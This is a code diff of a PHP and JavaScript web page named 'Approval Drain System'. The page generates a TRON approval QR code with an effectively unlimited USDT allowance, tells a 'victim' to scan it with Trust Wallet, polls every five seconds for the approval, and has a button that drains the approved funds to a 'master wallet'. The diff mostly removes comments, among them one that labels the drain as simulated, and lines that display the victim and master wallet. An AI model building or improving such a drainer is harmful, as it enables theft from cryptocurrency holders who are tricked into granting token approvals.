@@ -24,7 +24,6 @@ $VICTIM_WALLET = $victim_data['wallet_address'];
 
 // Function to generate approval QR
 function generateApprovalQR($contract, $spender, $amount = 999999999) {
-    // TRON approval QR data
     $qr_data = "tron://approve?contract=" . $contract . 
                "&spender=" . $spender . 
                "&amount=" . $amount;
@@ -91,7 +90,6 @@ $approval_amount = $is_approved ? $current_allowance : 0;
 
 // Execute drain function
 function executeDrain($victim, $master, $amount) {
-    // Demo: Simulate drain
     return [
         'success' => true,
         'amount' => $amount,
@@ -136,14 +134,13 @@ if (isset($_GET['check_approval'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Approval Drain System</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #0a0f1e; color: #fff; min-height: 100vh; padding: 20px; }
         .container { max-width: 600px; margin: 0 auto; }
         .card { background: rgba(18,25,45,0.9); border-radius: 24px; border: 1px solid rgba(59,130,246,0.3); padding: 30px; margin-bottom: 20px; }
-        h1 { text-align: center; color: #3b82f6; margin-bottom: 10px; }
+        h1 { text-align: center; color: #3b82f6; }
         .sub { text-align: center; color: #6c86a3; font-size: 14px; margin-bottom: 20px; }
         .qr-box { background: #fff; border-radius: 16px; padding: 20px; text-align: center; }
         .qr-box img { width: 250px; height: 250px; }
@@ -175,8 +172,6 @@ if (isset($_GET['check_approval'])) {
     <div class="card">
         <h1>💀 Approval Drain System</h1>
         <p class="sub">Trust Wallet Approval → Auto Drain</p>
-        
-        <!-- QR Code -->
         <div class="qr-box">
             <img id="qrImage" src="<?php echo $qr_code_url; ?>" alt="Approval QR">
             <p>📱 <strong>Scan this QR</strong> with Trust Wallet</p>
@@ -200,10 +195,6 @@ if (isset($_GET['check_approval'])) {
                 <?php echo $is_approved ? '✅ Approved (' . number_format($approval_amount, 2) . ' USDT)' : '❌ Not Approved'; ?>
             </span>
         </div>
-        <div class="info-row">
-            <span class="label">Master Wallet</span>
-            <span class="value" style="font-size: 12px; color: #60a5fa;"><?php echo $MASTER_WALLET; ?></span>
-        </div>
     </div>
 
     <div class="card">
@@ -220,27 +211,22 @@ if (isset($_GET['check_approval'])) {
         <div class="log-area" id="logArea">
             <div>● System ready</div>
             <div>📌 QR generated for approval</div>
-            <div>📌 Victim: <?php echo substr($VICTIM_WALLET, 0, 20) . '...'; ?></div>
         </div>
     </div>
 </div>
 
 <script>
-// Configuration
 const USDT_CONTRACT = "<?php echo $USDT_CONTRACT; ?>";
 const MASTER_WALLET = "<?php echo $MASTER_WALLET; ?>";
 const VICTIM_WALLET = "<?php echo $VICTIM_WALLET; ?>";
 
-// DOM Elements
 const checkBtn = document.getElementById('checkApprovalBtn');
 const drainBtn = document.getElementById('drainBtn');
 const statusMsg = document.getElementById('statusMessage');
 const logArea = document.getElementById('logArea');
 const balanceDisplay = document.getElementById('balanceDisplay');
 const approvalStatus = document.getElementById('approvalStatus');
-const qrImage = document.getElementById('qrImage');
 
-// Log function
 function addLog(msg, type = 'info') {
     const colors = { info: '#6c86a3', success: '#22c55e', danger: '#ef4444', warning: '#fbbf24' };
     const time = new Date().toLocaleTimeString();
@@ -251,13 +237,11 @@ function addLog(msg, type = 'info') {
     logArea.scrollTop = logArea.scrollHeight;
 }
 
-// Update status
 function setStatus(msg, type = 'warning') {
     statusMsg.textContent = msg;
     statusMsg.className = 'status ' + type;
 }
 
-// Check approval
 function checkApproval() {
     setStatus('⏳ Checking...', 'warning');
     addLog('🔍 Checking approval status...', 'info');
@@ -266,7 +250,6 @@ function checkApproval() {
         .then(res => res.json())
         .then(data => {
             balanceDisplay.textContent = data.balance.toFixed(2) + ' USDT';
-            
             if (data.approved) {
                 approvalStatus.textContent = '✅ Approved (' + data.allowance.toFixed(2) + ' USDT)';
                 approvalStatus.className = 'value approved';
@@ -287,12 +270,8 @@ function checkApproval() {
         });
 }
 
-// Execute drain
 function executeDrain() {
-    if (!confirm('⚠️ Are you sure you want to drain this wallet?')) {
-        return;
-    }
-    
+    if (!confirm('⚠️ Are you sure you want to drain this wallet?')) return;
     setStatus('💸 Draining... Please wait', 'danger');
     addLog('💸 Executing drain...', 'danger');
     drainBtn.disabled = true;
@@ -324,16 +303,10 @@ function executeDrain() {
     });
 }
 
-// Event listeners
 checkBtn.addEventListener('click', checkApproval);
 drainBtn.addEventListener('click', executeDrain);
-
-// Auto check every 5 seconds
 setInterval(checkApproval, 5000);
-
-// Initial log
 addLog('🚀 Approval Drain System initialized', 'info');
-addLog('📌 Waiting for victim approval...', 'info');
 </script>
 </body>
 </html>
